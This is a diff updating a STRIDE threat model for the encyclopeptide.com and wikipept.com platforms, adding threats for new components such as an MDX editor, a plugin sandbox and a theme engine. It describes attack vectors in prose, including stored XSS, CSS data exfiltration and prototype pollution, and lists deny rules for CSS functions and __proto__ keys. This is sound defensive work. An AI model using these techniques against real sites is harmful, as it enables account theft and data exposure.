@@ -1,8 +1,8 @@
 ---
 document_id: SEC-THREAT-001
 title: "STRIDE Threat Model — Wikisites Dual-Site Platform"
-version: "1.0.0"
-date: "2026-06-07"
+version: "2.0.0"
+date: "2026-06-19"
 status: DRAFT
 authors:
   - name: "Wikisites Security Team"
@@ -16,8 +16,12 @@ abstract: >-
   STRIDE threat model covering both encyclopeptide.com and wikipept.com.
   Identifies spoofing, tampering, repudiation, information disclosure,
   denial of service, and elevation of privilege threats across all system
-  layers. Includes threat trees, attack graphs, risk ratings using CVSS
-  3.1 scoring, and mitigation mappings to NIST SP 800-53 and OWASP Top 10.
+  layers including Phase 2 new components: Command Palette, Keyboard
+  Shortcuts, Graph View, LaTeX Renderer, Regex Search, Comments,
+  Annotations, User Accounts, MDX Editor, Plugin API, Theme Engine,
+  and Settings Manager. Includes threat trees, attack graphs, risk
+  ratings using CVSS 3.1 scoring, and mitigation mappings to NIST
+  SP 800-53 and OWASP Top 10.
 applicable_standards:
   - "NIST SP 800-53 Rev. 5"
   - "OWASP Top 10 2021"
@@ -28,8 +32,8 @@ applicable_standards:
 # STRIDE Threat Model — Wikisites Dual-Site Platform
 
 **Document ID:** SEC-THREAT-001
-**Version:** 1.0.0
-**Date:** 2026-06-07
+**Version:** 2.0.0
+**Date:** 2026-06-19
 **Status:** DRAFT
 **Applicable Sites:** encyclopeptide.com, wikipept.com
 
@@ -59,28 +63,36 @@ applicable_standards:
 
 ### 1.1 Purpose
 
-This document presents a comprehensive STRIDE threat model for both wikisites: **encyclopeptide.com** (formal encyclopedic reference, read-only) and **wikipept.com** (collaborative wiki with user accounts, editing, quizzes, and flashcards). The threat model identifies security risks across the entire attack surface — from Cloudflare edge infrastructure through client-side JavaScript — and provides risk-rated mitigations traceable to NIST SP 800-53 controls and OWASP Top 10 2021 categories.
+This document presents a comprehensive STRIDE threat model for both wikisites: **encyclopeptide.com** (formal encyclopedic reference, read-only) and **wikipept.com** (collaborative wiki with user accounts, editing, quizzes, and flashcards). Version 2.0 extends the original model to cover all Phase 2 new components: Command Palette, Keyboard Shortcuts, Graph View, LaTeX Renderer, Regex Search, Comments (Giscus + custom), Annotations, User Accounts (OAuth/JWT), MDX Editor, Plugin API (Web Worker sandbox), Theme Engine (CSS custom properties), and Settings Manager. The threat model identifies security risks across the entire attack surface — from Cloudflare edge infrastructure through client-side JavaScript — and provides risk-rated mitigations traceable to NIST SP 800-53 controls and OWASP Top 10 2021 categories.
 
 ### 1.2 Key Findings
 
 | Category | Total Threats | Critical | High | Medium | Low |
 |----------|---------------|----------|------|--------|-----|
-| Spoofing | 7 | 1 | 3 | 2 | 1 |
-| Tampering | 9 | 2 | 3 | 3 | 1 |
-| Repudiation | 5 | 0 | 2 | 2 | 1 |
-| Information Disclosure | 8 | 1 | 3 | 3 | 1 |
-| Denial of Service | 6 | 1 | 2 | 2 | 1 |
-| Elevation of Privilege | 7 | 1 | 3 | 2 | 1 |
-| **Total** | **42** | **6** | **16** | **14** | **6** |
+| Spoofing | 9 | 1 | 4 | 3 | 1 |
+| Tampering | 14 | 3 | 5 | 4 | 2 |
+| Repudiation | 7 | 0 | 3 | 3 | 1 |
+| Information Disclosure | 11 | 2 | 4 | 4 | 1 |
+| Denial of Service | 10 | 1 | 4 | 4 | 1 |
+| Elevation of Privilege | 10 | 2 | 4 | 3 | 1 |
+| **Total** | **61** | **7** | **24** | **21** | **7** |
 
-### 1.3 Risk Summary
+### 1.3 New Component Threat Summary (Phase 2)
 
-| Risk Level | Count | Action Required |
-|------------|-------|-----------------|
-| Critical (CVSS 9.0-10.0) | 6 | Immediate remediation before launch |
-| High (CVSS 7.0-8.9) | 16 | Remediation before launch |
-| Medium (CVSS 4.0-6.9) | 14 | Mitigation plan required; acceptable for launch with compensating controls |
-| Low (CVSS 0.1-3.9) | 6 | Accept or defer to post-launch |
+| Component | Key Threats | Highest Risk |
+|-----------|------------|--------------|
+| Command Palette | Input injection, keylogging | Medium |
+| Keyboard Shortcuts | Focus trap bypass, input capture collision | Low |
+| Graph View | Data exfiltration via URL, clickjacking | Medium |
+| LaTeX Renderer | Expression injection, ReDoS in parser | Medium |
+| Regex Search | ReDoS (algorithmic complexity DoS) | High |
+| Comments (Giscus + custom) | XSS in comment body, CSRF on submit | High |
+| Annotations | Stored XSS, annotation spoofing | High |
+| User Accounts | JWT theft, OAuth redirect manipulation | Critical |
+| MDX Editor | Stored XSS in rendered output, CSRF | Critical |
+| Plugin API | Sandbox escape, capability escalation | Critical |
+| Theme Engine | CSS injection, data exfiltration via CSS | Medium |
+| Settings Manager | Data injection, localStorage poisoning | Medium |
 
 ---
 
@@ -97,12 +109,13 @@ This document presents a comprehensive STRIDE threat model for both wikisites: *
 | OAuth authentication flow | Content accuracy (scientific correctness) |
 | User-generated content (wiki edits, annotations, quizzes) | |
 | Build pipeline and CI/CD | |
+| **Phase 2 components: Command Palette, Keyboard Shortcuts, Graph View, LaTeX Renderer, Regex Search, Comments, Annotations, User Accounts, MDX Editor, Plugin API, Theme Engine, Settings Manager** | |
 
 ### 2.2 Methodology
 
 - **Framework:** Microsoft STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)
 - **Risk Rating:** CVSS 3.1 (Common Vulnerability Scoring System)
-- **Attack Surface Analysis:** Based on architecture decomposition from BP-SITE-ENCP-001, BP-SITE-WIKI-001, BP-INFRA-CF-001, BP-COMP-SHARED-001
+- **Attack Surface Analysis:** Based on architecture decomposition from BP-SITE-ENCP-001, BP-SITE-WIKI-001, BP-INFRA-CF-001, BP-COMP-SHARED-001, BP-POWER-USER-SHELL-001, BP-SOCIAL-LAYER-001, BP-EDITOR-001, BP-EXTENSIBILITY-001, BP-CONTENT-TOOLS-001
 - **Mitigation Mapping:** NIST SP 800-53 Rev. 5 controls and OWASP Top 10 2021 categories
 
 ### 2.3 Asset Inventory
@@ -124,6 +137,16 @@ This document presents a comprehensive STRIDE threat model for both wikisites: *
 | Cloudflare D1 databases | High | System | WIKI |
 | Cloudflare KV namespaces | Medium | System | SHARED |
 | R2 buckets (user uploads) | Medium | User | WIKI |
+| Plugin manifests and code bundles | Medium | Community | SHARED |
+| Theme definitions and CSS tokens | Low | Community | SHARED |
+| User settings (imported/exported) | Medium | User | WIKI |
+| Command palette input history | Low | User | SHARED |
+| Keyboard shortcut mappings | Low | User | SHARED |
+| Graph view data (article links, tags) | Low | Public | SHARED |
+| LaTeX expression source | Low | Public | SHARED |
+| Regex search patterns | Low | User | SHARED |
+| Annotation content (user-generated) | Medium | Community | WIKI |
+| Comment content (user-generated) | Medium | Community | WIKI |
 
 ---
 
@@ -156,46 +179,46 @@ Trust Boundary 5: Client-Side
   TB5.2: localStorage / sessionStorage
   TB5.3: Service Worker Cache
   TB5.4: WebGL Context (3D Viewer)
+  TB5.5: Web Worker Sandbox (Plugin API)
+  TB5.6: CSS OM (Theme Engine)
+  TB5.7: RegExp Engine (Regex Search)
 
 Trust Boundary 6: External Integrations
   TB6.1: OAuth Provider (GitHub/Google/ORCID)
   TB6.2: External Databases (UniProt, PDB, ChEMBL)
   TB6.3: Cloudflare Web Analytics
+  TB6.4: GitHub Discussions API (Giscus)
 ```
 
-### 3.2 Entry Points
+### 3.2 Entry Points (Phase 2 Additions)
 
-| Entry Point | Type | Site | Attack Surface |
-|-------------|------|------|----------------|
-| `GET /api/v1/peptides` | API | ENCP | Query parameter injection, information disclosure |
-| `GET /api/v1/peptides/{id}` | API | ENCP | Path traversal, IDOR |
-| `GET /api/v1/peptides/{id}/structure` | API | ENCP | SSRF via external fetch |
-| `POST /api/v1/pages/{slug}/edit` | API | WIKI | XSS, content injection, CSRF |
-| `POST /api/v1/pages/{slug}/revert` | API | WIKI | Authorization bypass |
-| `POST /api/v1/quizzes/{sessionId}/answer` | API | WIKI | Answer manipulation, session hijack |
-| `POST /api/v1/flashcards/rate` | API | WIKI | FSRS parameter manipulation |
-| `POST /api/v1/flashcards/decks/import` | API | WIKI | Malicious file upload |
-| `POST /api/v1/pages/{slug}/annotations` | API | WIKI | XSS in annotation content |
-| `POST /api/v1/pages/{slug}/flag` | API | WIKI | Spam/abuse |
-| OAuth callback endpoint | API | WIKI | OAuth state manipulation |
-| WebSocket (Durable Objects) | Protocol | WIKI | WebSocket hijacking, injection |
-| Search query parameter | Input | SHARED | Search injection, ReDoS |
-| File upload (R2) | Input | WIKI | Malicious file upload, storage exhaustion |
-| Client-side JavaScript | Code | SHARED | XSS, prototype pollution |
-
-### 3.3 Data Stores
-
-| Data Store | Sensitivity | Encryption at Rest | Encryption in Transit | Access Control |
-|------------|------------|-------------------|----------------------|----------------|
-| D1: wikipept-users | High | Cloudflare-managed | TLS 1.2+ | Worker-only |
-| D1: wikipept-content | Medium | Cloudflare-managed | TLS 1.2+ | Worker-only |
-| D1: wikipept-quiz | Medium | Cloudflare-managed | TLS 1.2+ | Worker-only |
-| D1: wikipept-flashcards | Medium | Cloudflare-managed | TLS 1.2+ | Worker-only |
-| D1: wikipept-progress | Medium | Cloudflare-managed | TLS 1.2+ | Worker-only |
-| D1: wikipept-reputation | Low-Medium | Cloudflare-managed | TLS 1.2+ | Worker-only |
-| KV: wikipept-sessions | High | Cloudflare-managed | TLS 1.2+ | Worker-only |
-| KV: wikipept-search | Low | Cloudflare-managed | TLS 1.2+ | Worker-only |
-| R2: wikipept-uploads | Medium | Cloudflare-managed | TLS 1.2+ | Worker + presigned URLs |
+| Entry Point | Component | Type | Attack Surface |
+|-------------|-----------|------|----------------|
+| `Ctrl+K` / Command Palette input | CommandPalette | Client Input | Command injection, XSS via rendered results |
+| Global keydown listener | KeyboardShortcuts | Client Event | Keylogging, focus trap bypass |
+| Graph data JSON endpoint | GraphView | Client Data | Data exfiltration, prototype pollution |
+| Canvas click handler | GraphView | Client Event | Clickjacking, phishing redirect |
+| LaTeX expression input | LaTeXRenderer | Client Input | Expression injection, ReDoS |
+| LaTeX SSR output | LaTeXRenderer | Server Output | Stored XSS in rendered HTML |
+| Regex pattern input | RegexSearch | Client Input | ReDoS (catastrophic backtracking) |
+| Regex search results | RegexSearch | Client Output | XSS in match highlighting |
+| Comment submission form | Comments | Client → Server | CSRF, stored XSS in comment body |
+| Giscus iframe embed | Comments | External | Clickjacking, content injection |
+| Annotation creation UI | Annotations | Client → Server | Stored XSS, XPath injection |
+| Annotation rendering | Annotations | Client Output | DOM-based XSS via anchor resolution |
+| OAuth login callback | UserAccounts | Server | OAuth state manipulation, redirect URI bypass |
+| JWT token storage | UserAccounts | Client | Token theft, session hijacking |
+| MDX editor content | MDXEditor | Client Input | Stored XSS in rendered output, CSRF on save |
+| MDX preview rendering | MDXEditor | Client Output | XSS via MDX component injection |
+| Plugin install manifest | PluginAPI | Client → Server | Malicious manifest, dependency confusion |
+| Plugin Web Worker execution | PluginAPI | Client Sandbox | Sandbox escape, capability escalation |
+| Plugin postMessage API | PluginAPI | Client IPC | Message injection, prototype pollution |
+| Theme CSS custom properties | ThemeEngine | Client | CSS injection, data exfiltration via CSS |
+| Theme marketplace download | ThemeEngine | Client → Server | Malicious CSS, resource exhaustion |
+| Settings import file | SettingsManager | Client Input | JSON injection, prototype pollution |
+| Settings export download | SettingsManager | Client Output | Data exfiltration |
+| Settings sync endpoint | SettingsManager | Client → Server | Data tampering, injection |
+| Service Worker registration | ServiceWorker | Client | Cache poisoning, offline XSS |
 
 ---
 
@@ -275,7 +298,7 @@ Spoofing threats involve an attacker pretending to be another user, system compo
 |-------|-------|
 | **Threat ID** | S-05 |
 | **Description** | Attacker edits a wiki page and attributes the edit to another user by manipulating the authorId field in the edit submission |
-| **Affected Component** | WikiService, Durable Objects |
+| **Affected Component** | WikiService, Durable Objects, MDXEditor |
 | **Affected Site** | WIKI |
 | **Trust Boundary Crossed** | TB2.2 (Workers), TB2.3 (Durable Objects) |
 | **CVSS 3.1** | **6.5 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N |
@@ -314,6 +337,36 @@ Spoofing threats involve an attacker pretending to be another user, system compo
 | **Mitigation** | Cloudflare enforces Worker-to-storage binding isolation; no public access to D1/KV/R2 endpoints; verify binding configuration in wrangler.toml |
 | **Verification** | Configuration audit of wrangler.toml; attempt direct access to storage endpoints |
 
+### 4.8 Threat S-08: Annotation Spoofing (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | S-08 |
+| **Description** | Attacker creates an annotation that appears to originate from another user by manipulating the author field in the annotation creation request |
+| **Affected Component** | AnnotationLayer (annotationStore.ts) |
+| **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB4 (Client-Server) |
+| **CVSS 3.1** | **6.5 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N |
+| **OWASP Top 10** | A04:2021 — Insecure Design |
+| **NIST SP 800-53** | AC-3, AU-3 |
+| **Mitigation** | Derive annotation author from authenticated JWT session; server-side override of author fields; audit log records authenticated identity for all annotation create/update operations |
+| **Verification** | Unit test: forged authorId in annotation request ignored; integration test: annotation author matches session user |
+
+### 4.9 Threat S-09: Comment Spoofing via Giscus Bypass (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | S-09 |
+| **Description** | Attacker submits a comment to the custom D1 comment store that appears to originate from another user, bypassing GitHub identity verification that Giscus provides |
+| **Affected Component** | CommentsSystem (customCommentStore.ts, spamGuard.ts) |
+| **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB4 (Client-Server), TB6.4 (GitHub Discussions API) |
+| **CVSS 3.1** | **6.8 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N |
+| **OWASP Top 10** | A07:2021 — Identification and Authentication Failures |
+| **NIST SP 800-53** | IA-2, AU-3 |
+| **Mitigation** | Custom comment store must verify JWT session and derive author from token; never accept client-supplied author fields; display verified badge only for Giscus-authenticated comments; rate-limit comment creation per user |
+| **Verification** | Unit test: forged author in custom comment rejected; integration test: comment attribution matches JWT identity |
+
 ---
 
 ## 5. STRIDE Category 2: Tampering
@@ -326,7 +379,7 @@ Tampering threats involve unauthorized modification of data, code, or configurat
 |-------|-------|
 | **Threat ID** | T-01 |
 | **Description** | Attacker injects malicious JavaScript into wiki page content that executes in other users' browsers, stealing session tokens, defacing content, or redirecting users |
-| **Affected Component** | WikiEditor, WikiService, Content Rendering (MDX) |
+| **Affected Component** | WikiEditor, WikiService, Content Rendering (MDX), MDXEditor |
 | **Affected Site** | WIKI |
 | **Trust Boundary Crossed** | TB5.1 (Browser DOM) |
 | **Attack Vector** | Attacker submits wiki content containing script tags, event handlers (onerror, onload), or javascript: URIs; if MDX rendering does not sanitize HTML, the script executes in readers' browsers |
@@ -334,7 +387,7 @@ Tampering threats involve unauthorized modification of data, code, or configurat
 | **CVSS 3.1** | **9.1 (Critical)** — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N |
 | **OWASP Top 10** | A03:2021 — Injection |
 | **NIST SP 800-53** | SI-10, SI-15, AC-3 |
-| **Mitigation** | Sanitize all user-generated HTML via DOMPurify; strip script, iframe, object, embed tags; CSP script-src 'self' with nonce-based exceptions; use MDX with restricted JSX (no raw HTML); server-side content validation before storage |
+| **Mitigation** | Sanitize all user-generated HTML via DOMPurify; strip script, iframe, object, embed tags; CSP script-src 'self' with nonce-based exceptions; use MDX with restricted JSX (no raw HTML); server-side content validation before storage; MDX editor must sanitize output before preview rendering |
 | **Verification** | XSS payload injection test (all common vectors); CSP violation report audit; DOMPurify configuration review |
 
 ### 5.2 Threat T-02: XSS via Annotation Content
@@ -349,7 +402,7 @@ Tampering threats involve unauthorized modification of data, code, or configurat
 | **CVSS 3.1** | **8.1 (Critical)** — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N |
 | **OWASP Top 10** | A03:2021 — Injection |
 | **NIST SP 800-53** | SI-10, AC-3 |
-| **Mitigation** | Sanitize annotation content via DOMPurify; render annotations as text not HTML; CSP nonce-based script blocking; server-side content validation |
+| **Mitigation** | Sanitize annotation content via DOMPurify; render annotations as text not HTML; CSP nonce-based script blocking; server-side content validation; W3C Web Annotation data model enforces structured body (no raw HTML in body.value) |
 | **Verification** | XSS payload injection in annotation content; verify sanitized output |
 
 ### 5.3 Threat T-03: Content Injection via Search Parameter Manipulation
@@ -394,7 +447,7 @@ Tampering threats involve unauthorized modification of data, code, or configurat
 | **CVSS 3.1** | **9.8 (Critical)** — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
 | **OWASP Top 10** | A03:2021 — Injection |
 | **NIST SP 800-53** | SI-10, AC-3 |
-| **Mitigation** | Use D1 prepared statements with parameterized queries exclusively; never concatenate user input into SQL; validate input types before query execution; apply principle of least privilege to D1 database bindings |
+| **Mitigation** | Use D1 prepared statements with parameterized queries exclusively; never concatenate user input into SQL; validate input types before query execution; apply principle of least privilege to D1 database bindings; static analysis rule SEC-010 enforces `.prepare().bind()` pattern |
 | **Verification** | SQL injection test on all API endpoints; code review for string concatenation patterns; static analysis for SQL injection |
 
 ### 5.6 Threat T-06: Wiki Content Tampering via Race Condition
@@ -403,13 +456,13 @@ Tampering threats involve unauthorized modification of data, code, or configurat
 |-------|-------|
 | **Threat ID** | T-06 |
 | **Description** | Two users edit the same wiki page simultaneously; the second edit overwrites the first without conflict detection, causing data loss |
-| **Affected Component** | Durable Objects (WikiRoom) |
+| **Affected Component** | Durable Objects (WikiRoom), MDXEditor CollaborationEngine (Yjs CRDT) |
 | **Affected Site** | WIKI |
 | **Trust Boundary Crossed** | TB2.3 (Durable Objects) |
 | **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N |
 | **OWASP Top 10** | A04:2021 — Insecure Design |
 | **NIST SP 800-53** | AC-3, CM-3 |
-| **Mitigation** | Durable Objects enforce single-writer per page; base revision checked server-side before commit; optimistic concurrency with conflict detection (HTTP 409); full edit history preserved for rollback |
+| **Mitigation** | Durable Objects enforce single-writer per page; base revision checked server-side before commit; optimistic concurrency with conflict detection (HTTP 409); full edit history preserved for rollback; Yjs CRDT provides conflict-free merge for concurrent edits |
 | **Verification** | Concurrent edit test: two sessions edit same page; verify conflict detection triggers; verify no data loss |
 
 ### 5.7 Threat T-07: Flashcard FSRS State Manipulation
@@ -457,6 +510,81 @@ Tampering threats involve unauthorized modification of data, code, or configurat
 | **Mitigation** | Lockfile with integrity hashes; npm audit in CI; Dependabot/Renovate for dependency review; signed commits; branch protection rules; reproducible builds |
 | **Verification** | Build with tampered lockfile; verify rejected; review CI/CD configuration for injection points |
 
+### 5.10 Threat T-10: XSS via MDX Editor Output (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | T-10 |
+| **Description** | Attacker uses the MDX editor to craft content containing malicious JSX components or raw HTML that executes JavaScript when rendered in other users' browsers |
+| **Affected Component** | MDXEditor (TipTap + MDX extensions), PreviewRenderer |
+| **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB5.1 (Browser DOM), TB4 (Client-Server) |
+| **CVSS 3.1** | **9.1 (Critical)** — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N |
+| **OWASP Top 10** | A03:2021 — Injection |
+| **NIST SP 800-53** | SI-10, SI-15 |
+| **Mitigation** | MDX rendering pipeline restricts available JSX components to a whitelist; raw HTML blocked by MDX compiler; server-side sanitization via DOMPurify on all stored content; preview renderer uses sandboxed iframe; CSP nonce blocks inline scripts in preview |
+| **Verification** | Attempt to inject `<script>`, event handlers, and `javascript:` URIs via MDX editor; verify all are stripped or blocked; test MDX component whitelist bypass |
+
+### 5.11 Threat T-11: Plugin Sandbox Escape (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | T-11 |
+| **Description** | Attacker publishes a malicious plugin that escapes the Web Worker sandbox to access the main thread DOM, steal session tokens, or manipulate other plugins |
+| **Affected Component** | PluginAPI (pluginSandbox.ts, capabilityMatrix.ts) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.5 (Web Worker Sandbox), TB5.1 (Browser DOM) |
+| **CVSS 3.1** | **9.0 (Critical)** — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N |
+| **OWASP Top 10** | A03:2021 — Injection, A08:2021 — Integrity Failures |
+| **NIST SP 800-53** | SI-3, AC-3, SC-39 |
+| **Mitigation** | Plugins execute exclusively in Web Worker (no DOM access); postMessage protocol uses structured clone (no function serialization); capability matrix enforced on every API call; plugin code undergoes static analysis before marketplace listing; CSP worker-src restricts Worker origins; plugin bundles signed with developer keys; resource limits (CPU time, memory) enforced per Worker |
+| **Verification** | Attempt DOM access from plugin Worker; verify SecurityError thrown; attempt to import DOM APIs; verify blocked; fuzz postMessage interface; verify no prototype pollution; test plugin crash isolation |
+
+### 5.12 Threat T-12: CSS Injection via Theme Engine (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | T-12 |
+| **Description** | Attacker creates a malicious theme that injects CSS to exfiltrate data (e.g., reading input values via attribute selectors) or deface the UI |
+| **Affected Component** | ThemeEngine (themeEngine.ts, themeInheritance.ts) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.6 (CSS OM), TB5.1 (Browser DOM) |
+| **CVSS 3.1** | **6.5 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N |
+| **OWASP Top 10** | A03:2021 — Injection |
+| **NIST SP 800-53** | SI-10, SI-15 |
+| **Mitigation** | Theme tokens validated against ThemeTokens Zod schema (hex colors, CSS lengths only); no `url()`, `expression()`, `behavior`, or `-moz-binding` allowed in token values; CSS custom properties only (no raw CSS injection); theme marketplace performs automated CSS analysis; themes loaded from same-origin or signed CDN; CSP style-src restricts allowed stylesheets |
+| **Verification** | Submit theme with `expression()` in token value; verify rejected by Zod schema; submit theme with `url()` for data exfiltration; verify blocked; test CSS data exfiltration techniques (attribute selectors on input values); verify mitigated |
+
+### 5.13 Threat T-13: Settings Data Injection (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | T-13 |
+| **Description** | Attacker crafts a malicious settings import file that injects malicious configuration, overwrites security-critical settings, or triggers prototype pollution |
+| **Affected Component** | SettingsManager (settingsImporter.ts, settingsValidator.ts, conflictResolver.ts) |
+| **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB5.1 (Browser DOM), TB4 (Client-Server) |
+| **CVSS 3.1** | **6.5 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N |
+| **OWASP Top 10** | A03:2021 — Injection, A08:2021 — Integrity Failures |
+| **NIST SP 800-53** | SI-10, CM-7 |
+| **Mitigation** | Settings import validated via dual JSON Schema + Zod validation; `__proto__`, `constructor`, `prototype` keys rejected; schema version compatibility checked before merge; security-critical settings (CSP, auth config) not user-overridable; import from URL blocked (file and clipboard only); max import size enforced (100KB) |
+| **Verification** | Import settings with `__proto__` key; verify rejected; import settings with `constructor.pollution`; verify rejected; attempt to override CSP settings; verify blocked; import oversized file; verify rejected |
+
+### 5.14 Threat T-14: Service Worker Cache Poisoning (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | T-14 |
+| **Description** | Attacker poisons the Service Worker cache with malicious versions of pages or scripts, causing offline execution of malicious code |
+| **Affected Component** | Service Worker (wikipept PWA) |
+| **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB5.3 (Service Worker Cache) |
+| **CVSS 3.1** | **7.5 (High)** | AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N |
+| **OWASP Top 10** | A08:2021 — Software and Data Integrity Failures |
+| **NIST SP 800-53** | SI-7, SC-28 |
+| **Mitigation** | Service Worker scope restricted to origin; cache versioning with cache-busting hashes; SW registration via same-origin script only; CSP worker-src 'self'; integrity verification of cached assets via content hashes; SW update mechanism with user notification |
+| **Verification** | Attempt to register SW from cross-origin; verify rejected; attempt to poison cache with modified assets; verify version mismatch detected; test SW cache invalidation on update |
+
 ---
 
 ## 6. STRIDE Category 3: Repudiation
@@ -469,13 +597,13 @@ Repudiation threats involve an attacker denying their actions because the system
 |-------|-------|
 | **Threat ID** | R-01 |
 | **Description** | Attacker makes malicious wiki edits (vandalism, content injection) and claims they did not make them because the system lacks sufficient audit logging |
-| **Affected Component** | WikiService, ModerationService |
+| **Affected Component** | WikiService, ModerationService, MDXEditor |
 | **Affected Site** | WIKI |
 | **Trust Boundary Crossed** | TB2.2 (Workers) |
 | **CVSS 3.1** | **7.5 (High)** — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N |
 | **OWASP Top 10** | A09:2021 — Security Logging and Monitoring Failures |
 | **NIST SP 800-53** | AU-2, AU-3, AU-12 |
-| **Mitigation** | Log all edit operations with timestamp, authenticated user ID, source IP, user-agent, page slug, revision number, and edit summary; store audit logs in D1 (append-only); implement tamper-evident logging (hash chain) |
+| **Mitigation** | Log all edit operations with timestamp, authenticated user ID, source IP, user-agent, page slug, revision number, and edit summary; store audit logs in D1 (append-only); implement tamper-evident logging (hash chain); MDX editor saves log authorship from JWT, not client |
 | **Verification** | Edit a page; verify audit log entry contains all required fields; attempt to delete audit log entry; verify immutable |
 
 ### 6.2 Threat R-02: Moderation Queue Bypass Without Audit Trail
@@ -498,7 +626,7 @@ Repudiation threats involve an attacker denying their actions because the system
 |-------|-------|
 | **Threat ID** | R-03 |
 | **Description** | Administrative actions (role changes, account suspension, content deletion) are not logged, preventing accountability |
-| **Affected Component** | AuthService, ModerationService |
+| **Affected Component** | AuthService, ModerationService, RBACEnforcer |
 | **Affected Site** | WIKI |
 | **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N |
 | **OWASP Top 10** | A09:2021 — Security Logging and Monitoring Failures |
@@ -533,6 +661,36 @@ Repudiation threats involve an attacker denying their actions because the system
 | **NIST SP 800-53** | AU-2, AU-3, AC-7 |
 | **Mitigation** | Log all login attempts (success and failure) with source IP, user-agent, timestamp, and username attempted; implement account lockout after 5 failed attempts; alert on brute-force patterns |
 | **Verification** | Attempt 5 failed logins; verify lockout triggered; verify all attempts logged |
+
+### 6.6 Threat R-06: Plugin Installation Without Audit (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | R-06 |
+| **Description** | Attacker installs a malicious plugin and later denies the installation; system lacks audit trail for plugin lifecycle events |
+| **Affected Component** | PluginAPI (pluginRegistry.ts) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.5 (Web Worker Sandbox) |
+| **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N |
+| **OWASP Top 10** | A09:2021 — Security Logging and Monitoring Failures |
+| **NIST SP 800-53** | AU-2, AU-3 |
+| **Mitigation** | Log all plugin lifecycle events (install, uninstall, enable, disable) with user ID, plugin ID, version, timestamp; store in D1; plugin marketplace maintains download/install attribution |
+| **Verification** | Install plugin; verify audit log entry; uninstall plugin; verify audit log entry; attempt to install from untrusted source; verify logged and warned |
+
+### 6.7 Threat R-07: Annotation Creation Without Attribution (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | R-07 |
+| **Description** | Attacker creates annotations (including potentially malicious ones) and the system lacks sufficient attribution logging |
+| **Affected Component** | AnnotationLayer (annotationStore.ts) |
+| **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB4 (Client-Server) |
+| **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N |
+| **OWASP Top 10** | A09:2021 — Security Logging and Monitoring Failures |
+| **NIST SP 800-53** | AU-2, AU-3 |
+| **Mitigation** | Log all annotation operations (create, update, delete) with user ID, annotation ID, page slug, timestamp, and XPath selector; store in D1 audit table; annotation visibility changes logged |
+| **Verification** | Create annotation; verify audit log entry contains all required fields; delete annotation; verify soft-delete logged |
 
 ---
 
@@ -618,12 +776,12 @@ Information disclosure threats involve sensitive data being exposed to unauthori
 |-------|-------|
 | **Threat ID** | I-06 |
 | **Description** | Search functionality reveals information about what other users are searching for, or exposes internal document structure |
-| **Affected Component** | SearchService, SearchInterface |
+| **Affected Component** | SearchService, SearchInterface, RegexSearch |
 | **Affected Site** | SHARED |
 | **CVSS 3.1** | **4.3 (Medium)** — AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N |
 | **OWASP Top 10** | A01:2021 — Broken Access Control |
 | **NIST SP 800-53** | AC-3, AC-4 |
-| **Mitigation** | Search results do not include other users' search history; search suggestions do not leak indexed content not yet published; implement rate limiting on search endpoint |
+| **Mitigation** | Search results do not include other users' search history; search suggestions do not leak indexed content not yet published; implement rate limiting on search endpoint; regex search patterns stored client-side only |
 | **Verification** | Search audit: verify no cross-user data leakage; verify no draft content in search results |
 
 ### 7.7 Threat I-07: R2 Object Direct Access
@@ -647,14 +805,59 @@ Information disclosure threats involve sensitive data being exposed to unauthori
 |-------|-------|
 | **Threat ID** | I-08 |
 | **Description** | Attacker intercepts WebSocket messages between client and Durable Objects during wiki collaboration, reading edit content and user information |
-| **Affected Component** | Durable Objects WebSocket |
+| **Affected Component** | Durable Objects WebSocket, MDXEditor CollaborationEngine |
 | **Affected Site** | WIKI |
 | **Trust Boundary Crossed** | TB2.3 (Durable Objects), TB4 (Client-Server) |
 | **CVSS 3.1** | **5.9 (Medium)** — AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N |
 | **OWASP Top 10** | A02:2021 — Cryptographic Failures |
 | **NIST SP 800-53** | SC-8, SC-13 |
-| **Mitigation** | Enforce WSS (WebSocket Secure) only; validate WebSocket origin header; authenticate WebSocket connections via session token; encrypt sensitive data in WebSocket messages if needed |
